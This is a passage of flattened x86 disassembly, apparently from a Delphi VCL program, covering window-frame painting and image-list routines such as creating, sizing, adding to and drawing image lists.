mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_3abe448
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_3abe5a3
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_3abdf94
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3abdee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_3a78e1c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_3abe5d0
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov al 0x1
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_3abdccc
test al al
je r-xdata
sub_3abe61c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3abe661
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abe668
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax rw-data
call sub_3a652a0
mov eax [ rw-data ]
call sub_3a64380
sub_3abe888
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3abe8d4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_3a83664
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3abe928
push ebx
push esi
push edi
call sub_3a6478c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_3a7a57c
mov edx eax
mov eax edi
call sub_3abf5ac
mov eax [ edi + 0x50 ]
call sub_3a64380
mov eax edi
call sub_3abec74
mov eax [ edi + 0x4c ]
call sub_3a64380
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_3a836b0
test bl bl
jle r-xdata
call sub_3a64380
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a64734
sub_3abe994
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3abea41
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_3abf534
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_3abea60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abea48
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3abea60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3abeb01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_3a8f384
mov eax ebx
call sub_3a8e7d8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_3a89b20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_3a78e1c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_3a8e7d8
pop edx
call sub_3a89f04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abeb08
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3abeb24
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_3abea60
pop ecx
pop edx
pop ebx
retn
sub_3abeb5c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_3abea4c
test al al
je r-xdata
mov eax esi
call sub_3abeec8
mov eax esi
call sub_3abea60
mov eax esi
mov si 0xffef
call sub_3a6457c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_3abeba0
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_3abea4c
test al al
je r-xdata
mov eax esi
call sub_3abeec8
mov eax esi
call sub_3abea60
mov eax esi
mov si 0xffef
call sub_3a6457c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_3abebe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abec74
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3abeb24
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_3a6457c
sub_3abec20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3abf4bc
test esi esi
je r-xdata
mov eax [ ebx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov eax esi
call sub_3a8e844
cmp al 0x1
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3abec74
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_3a6457c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_3abec10
push eax
call ImageList_Destroy
sub_3abecac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3abed3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
movzx eax [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_3abea4c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abed45
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edx eax
mov eax ebx
call sub_3abeed4
sub_3abed4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abedfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3abedde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3abea54
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3abec20
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3abec20
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abede5
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
sub_3abee18
push ebx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_3abec10
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_3abee3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3abeebb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3abee18
cmp esi eax
jl r-xdata
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov eax ebx
mov si 0xffef
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abeec2
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push esi
mov eax ebx
call sub_3abec10
push eax
call ImageList_Remove
sub_3abeed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_3abe848
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_3a6457c
pop esi
pop ebx
retn
sub_3abef0c
push ebx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_3abec10
push eax
call ImageList_GetBkColor
call sub_3abe868
pop ebx
retn
sub_3abef34
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_3abe848
push eax
mov eax ebx
call sub_3abef0c
call sub_3abe848
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_3a8a340
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_3abec10
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_3a8e7d8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_3a89b20
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_3a78e1c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_3a8e7d8
pop edx
call sub_3a89f04
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_3a8e7d8
call sub_3a8a340
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_3abec10
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_3a78e1c
mov eax [ ebx + 0x54 ]
call sub_3a8e7d8
call sub_3a8a340
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_3a89b20
mov eax edi
call sub_3a8a340
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_3a89b20
mov eax edi
call sub_3a8a340
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_3a8f5a0
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_3abf108
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ eax + 0x40 ]
push ebx
movzx ebx [ eax + 0x43 ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_3abf130
pop ebx
pop ebp
retn 0xc
sub_3abf130
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_3abf17c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_3a78e1c
mov eax [ ebp - 0x4 ]
call sub_3abfe40
xor eax eax
push ebp
push sub_3abf315
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abf2f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3abf2db
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_3a8f5a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abf2e2
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_3a8e7d8
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_3a89f04
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_3a8a340
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_3a8e7d8
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_3a89f04
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_3a8a340
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3abed4c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_3abf324
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3abec10
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_3abf17c
sub_3abf344
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
call sub_3abec74
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3a7aad0
mov eax ebx
call sub_3abeec8
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_3abf534
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_3abec10
mov edx eax
mov eax ebx
call sub_3abeb24
mov eax ebx
call sub_3abea4c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_3abec10
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_3abea54
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3abec10
push eax
call ImageList_GetBkColor
call sub_3abe868
mov edx eax
mov eax ebx
call sub_3abeed4
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_3abf324
jmp r-xdata
sub_3abf408
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_3a7abb4
pop esi
pop ebx
retn
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_3abf534
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_3abeec8
mov eax esi
call sub_3abec10
mov edx eax
mov eax ebx
call sub_3abeb24
mov eax ebx
call sub_3abea4c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_3abec10
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_3abea54
jmp r-xdata
mov eax esi
call sub_3abec10
push eax
call ImageList_GetBkColor
call sub_3abe868
mov edx eax
mov eax ebx
call sub_3abeed4
mov edx esi
mov eax ebx
call sub_3abf324
pop esi
pop ebx
retn
sub_3abf4bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3abf528
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abf52f
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_3abf55c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_3a7a494
mov si 0xffff
call sub_3a6457c
inc ebp
dec edi
jne r-xdata
sub_3abf5ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_3a7a388
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_3a7a494
cmp ebp eax
jne r-xdata
sub_3abf604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_3a69360
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3abf648
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_3abee18
mov ebx eax
mov eax edi
call sub_3abee18
cmp ebx eax
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_3abee18
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3abf724
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abf707
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3abf604
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abf70e
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
mov eax edi
call sub_3abee18
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
